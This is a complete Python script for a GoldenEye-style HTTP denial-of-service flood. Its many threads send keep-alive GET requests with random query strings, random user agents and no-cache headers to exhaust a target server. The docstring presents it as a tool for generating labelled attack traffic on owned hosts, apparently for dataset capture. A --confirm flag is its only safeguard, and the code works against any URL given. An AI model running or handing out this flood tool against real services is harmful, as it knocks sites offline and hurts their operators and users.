#!/usr/bin/env python3
"""GoldenEye-style HTTP DoS — pure Python, cross-platform.

Concurrent keep-alive GETs with randomized query params + no-cache headers
(GoldenEye's signature: defeats caching and holds connections). Runs anywhere
with Python 3 (incl. Windows / Git Bash). Run from the ATTACKER host; pair with
capture.sh on the VPS. Label when capturing: "DoS attacks-GoldenEye".

HIGH impact — short bursts, hosts you own only.

Usage:
  python goldeneye.py <url> [--workers 50] [--duration 30] --confirm
"""
import argparse
import random
import ssl
import string
import sys
import threading
import time
import urllib.request


def _rand(n: int = 8) -> str:
    return "".join(random.choice(string.ascii_letters) for _ in range(n))


def _worker(url: str, end: float, ctx, stats: list) -> None:
    while time.time() < end:
        sep = "&" if "?" in url else "?"
        u = f"{url}{sep}{_rand()}={_rand()}"
        req = urllib.request.Request(u, headers={
            "User-Agent": f"Mozilla/5.0 ({_rand()})",
            "Cache-Control": "no-cache",
            "Keep-Alive": "300",
            "Connection": "keep-alive",
            "Accept-Encoding": _rand(3),
        })
        try:
            urllib.request.urlopen(req, timeout=5, context=ctx).read(64)
            stats[0] += 1
        except Exception:
            stats[1] += 1


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("url")
    ap.add_argument("--workers", type=int, default=50)
    ap.add_argument("--duration", type=int, default=30)
    ap.add_argument("--confirm", action="store_true", help="required (DoS vs live box)")
    a = ap.parse_args()
    if not a.confirm:
        print("Refusing: pass --confirm (this is a DoS against a live box)")
        return 1

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    end = time.time() + a.duration
    stats = [0, 0]
    print(f"goldeneye {a.url} workers={a.workers} dur={a.duration}s")
    threads = []
    for _ in range(a.workers):
        t = threading.Thread(target=_worker, args=(a.url, end, ctx, stats), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    print(f"done: ok={stats[0]} err={stats[1]}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
